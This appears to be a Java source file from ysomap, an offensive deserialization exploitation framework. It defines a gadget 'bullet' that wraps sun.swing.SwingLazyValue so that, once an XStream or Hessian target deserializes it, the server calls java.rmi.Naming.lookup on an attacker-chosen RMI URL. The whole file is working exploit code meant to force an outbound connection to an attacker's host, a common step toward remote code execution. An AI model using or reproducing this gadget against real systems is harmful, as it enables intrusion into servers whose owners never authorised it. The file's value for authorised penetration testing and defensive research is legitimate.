package ysomap.bullets.jdk;

import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.common.util.Logger;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3P1g
 * @since 2021/1/4
 */
@Bullets
@Dependencies({"jdk"})
@Details("向外部发起RMI连接")
@Targets({Targets.XSTREAM, Targets.HESSIAN})
@Authors({Authors.WH1T3P1G})
public class SwingLazyValueWithRMIBullet extends AbstractBullet<Object> {

    @NotNull
    @Require(name = "rmiURL", detail = "like rmi://xxx/xx")
    public String rmiURL;

    @Override
    public Object getObject() throws Exception {
        String classname = "java.rmi.Naming";
        String methodName = "lookup";
        Object[] evilargs = new Object[]{rmiURL};
        try{
            return ReflectionHelper.newInstance(
                    "sun.swing.SwingLazyValue",
                    new Class[]{String.class, String.class, Object[].class},
                    classname, methodName, evilargs);
        }catch (Exception e){
            Logger.error("Create sun.swing.SwingLazyValue, plz check current jdk is <=8.");
            return null;
        }
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new SwingLazyValueWithRMIBullet();
        bullet.set("rmiURL", args[0]);
        return bullet;
    }
}
